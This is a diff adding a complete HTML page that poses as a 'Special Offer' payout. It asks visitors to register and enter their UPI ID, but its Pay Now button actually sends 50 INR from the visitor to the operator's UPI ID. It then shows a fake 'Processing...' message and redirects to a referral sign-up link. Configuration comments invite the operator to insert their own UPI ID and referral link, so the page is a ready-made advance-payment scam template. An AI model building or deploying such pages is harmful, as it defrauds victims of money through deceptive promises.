@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Special Offer Payment</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background:#f9fafb;
+      margin:0;
+      padding:0;
+      display:flex;
+      justify-content:center;
+      align-items:center;
+      height:100vh;
+    }
+    .container {
+      width: 100%;
+      max-width: 420px;
+      background: #fff;
+      border-radius: 14px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+      overflow: hidden;
+      padding: 20px;
+      text-align: center;
+    }
+    h2 {
+      margin-bottom: 15px;
+      color:#1f2937;
+    }
+    p {
+      color:#4b5563;
+      font-size:14px;
+      margin-bottom:15px;
+    }
+    input, button {
+      padding: 10px;
+      margin: 10px 0;
+      width: 95%;
+      border-radius: 6px;
+      border: 1px solid #d1d5db;
+      font-size: 16px;
+      outline: none;
+    }
+    button {
+      background:#3b82f6;
+      color:white;
+      border:none;
+      cursor:pointer;
+      transition:0.3s;
+    }
+    button:hover {
+      background:#2563eb;
+    }
+    #msg {
+      font-weight: bold;
+      margin-top: 10px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Special Offer</h2>
+    <p>Download & Register Compulsory to Receive Payment</p>
+    <p>Submit your UPI carefully — don’t try multiple times. If you’re lucky, payment is instant!</p>
+
+    <!-- Username -->
+    <input type="text" id="username" placeholder="Enter Username (e.g., Player123)">
+    <!-- UPI ID -->
+    <input type="text" id="upi" placeholder="Enter Your UPI ID">
+
+    <!-- Pay Button -->
+    <a id="payLink" target="_blank">
+      <button type="button">Pay Now</button>
+    </a>
+
+    <!-- Transaction ID -->
+    <input type="text" id="txn" placeholder="Enter Transaction ID">
+
+    <!-- Submit Button -->
+    <button onclick="redirectNow()">Submit</button>
+    <p id="msg"></p>
+  </div>
+
+  <script>
+    // === CONFIGURATION ===
+    const YOUR_UPI_ID = "yourupi@upi";      // Apna UPI ID yaha daalo
+    const AMOUNT = 50;                      // Amount INR
+    const REDIRECT_URL = "https://invite.yk177.com/?code=T850RNZ"; // Tumhara refer link
+
+    // Set UPI Payment Link
+    document.getElementById('payLink').href =
+      `upi://pay?pa=${YOUR_UPI_ID}&pn=SpecialOffer&am=${AMOUNT}&cu=INR`;
+
+    // Redirect Function
+    function redirectNow() {
+      const username = document.getElementById('username').value.trim();
+      const upi = document.getElementById('upi').value.trim();
+      const txn = document.getElementById('txn').value.trim();
+
+      // Validation
+      if (!username || !upi || !txn) {
+        document.getElementById('msg').innerText = "All fields are required!";
+        document.getElementById('msg').style.color = "red";
+        return;
+      }
+
+      // UPI check (@ required)
+      if (!upi.includes("@")) {
+        document.getElementById('msg').innerText = "Invalid UPI ID!";
+        document.getElementById('msg').style.color = "red";
+        return;
+      }
+
+      // Show processing
+      document.getElementById('msg').innerText = "Processing...";
+      document.getElementById('msg').style.color = "orange";
+
+      // Redirect after 2 seconds
+      setTimeout(() => {
+        window.location.href = REDIRECT_URL;
+      }, 2000);
+    }
+  </script>
+</body>
+</html>
